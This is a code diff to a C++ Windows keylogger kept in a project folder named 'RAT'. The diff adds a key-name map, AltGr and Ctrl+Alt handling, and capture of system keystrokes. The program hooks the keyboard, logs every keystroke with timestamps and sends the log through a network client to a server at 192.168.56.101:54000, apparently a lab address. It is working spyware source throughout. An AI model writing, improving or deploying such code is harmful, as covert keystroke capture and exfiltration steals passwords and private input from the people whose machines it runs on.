@@ -13,6 +13,7 @@
 #include <C:\Users\thelab\development\RAT\network.h>
 #include <locale>
 #include <codecvt>
+#include <windows.h>
 
 HHOOK keyboardHook = NULL;
 std::vector<std::pair<std::string, std::wstring>> keystrokeVector;
@@ -20,6 +21,23 @@ std::wstring_convert<std::codecvt_utf8<wchar_t>, wchar_t> converter; //Convert w
 std::unordered_map<DWORD, bool> keyStates;
 std::mutex bufferMutex; 
 NetworkClient client("192.168.56.101", 54000); 
+
+std::unordered_map<DWORD, std::wstring> VirtualKeyMap = {
+    {VK_CAPITAL, L"[CAPS LOCK]"},
+    {VK_BACK, L"[BACKSPACE]"}, //
+    {VK_TAB, L"[TAB]"}, //
+    {VK_RETURN, L"[ENTER]"}, //
+    {VK_SHIFT, L"[SHIFT]"}, //
+    {VK_CONTROL, L"[CTRL]"}, //
+    {VK_MENU, L"[ALT]"}, //
+    {VK_ESCAPE, L"[ESC]"}, //
+    {VK_SPACE, L"[SPACE]"}, //
+    {VK_LEFT, L"[LEFT ARROW]"},
+    {VK_RIGHT, L"[RIGHT ARROW]"},
+    {VK_UP, L"[UP ARROW]"},
+    {VK_DOWN, L"[DOWN ARROW]"},
+    {VK_DELETE, L"[DELETE]"}, 
+};
 
 bool SendVectorToServer() {
     
@@ -86,10 +104,28 @@ std::string GetTimestap() {
     return std::string(buffer);
 }
 
+bool isCtrlPressed() {
+    return GetKeyState(VK_CONTROL) & 0x8000;
+}
+
+bool isAltPressed() {
+    return GetKeyState(VK_MENU) & 0x8000;
+}
+
+
 wchar_t VirtualKeyTochar(DWORD vkCode, bool shiftPressed, bool altGrPressed, UINT flags) {
     
     BYTE keyboardState[256]; // Buffer of all the 256 possible virtual keyboard states in windows. 
     GetKeyboardState(keyboardState); // Fill the array with the current keyboard state. 
+
+    if (isCtrlPressed() && isAltPressed() ) {  //&& (vkCode == 0x35 || 0x65)
+        return 0;
+    }
+
+    if (GetKeyState(VK_RMENU) & 0x8000) {
+        return 0;
+    }
+
 
     if (shiftPressed) {
         keyboardState[VK_SHIFT] = 0x80;
@@ -107,8 +143,12 @@ wchar_t VirtualKeyTochar(DWORD vkCode, bool shiftPressed, bool altGrPressed, UIN
     if (result > 0) {
         //std::wcout << L"Buffer: " << buffer << "\n";
         return buffer[0];
-    } else if (result == 0) {
-        std::wcout << L"No translation for VK:" << vkCode << "\n"; 
+    } else if (VirtualKeyMap.contains(vkCode)) {
+        std::wcout << L"Result: " << result << " - " << VirtualKeyMap.at(vkCode) << L"\n";
+    }
+    
+    else if (result == 0) {
+        std::wcout << L"No translation for VK:" << vkCode << "\n"; // Make a call to VK map. If its not in the map, print VK insted. 
     }
 
     return 0;
@@ -126,7 +166,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
             //Why place mutex here? 
             std::lock_guard<std::mutex> guard(bufferMutex);
-            if (wParam == WM_KEYDOWN) { //wPrarm == WM_SYSKEYDOWN
+            if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) { 
                 
 
                     // Checks if the shift key is pressen. TODO: understand why we use this notation.
@@ -139,7 +179,10 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
                     if (character != 0) {
                         keypress = character; 
-                    } else {
+                    } else if (VirtualKeyMap.contains(vkCode)) {
+                        keypress = VirtualKeyMap.at(vkCode);
+                    }
+                    else {
                         keypress = L"[VK:" + std::to_wstring(vkCode) + L"]";
                     }
 
@@ -149,7 +192,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             }
         
             //Log that a key has been released.        
-            else if (wParam == WM_KEYUP) { //wPrarm == WM_SYSKEYDOWN
+            else if (wParam == WM_KEYUP || wParam == WM_SYSKEYDOWN ) { 
                 keyStates[vkCode] = false; 
             } 
         } catch (const std::exception e) {
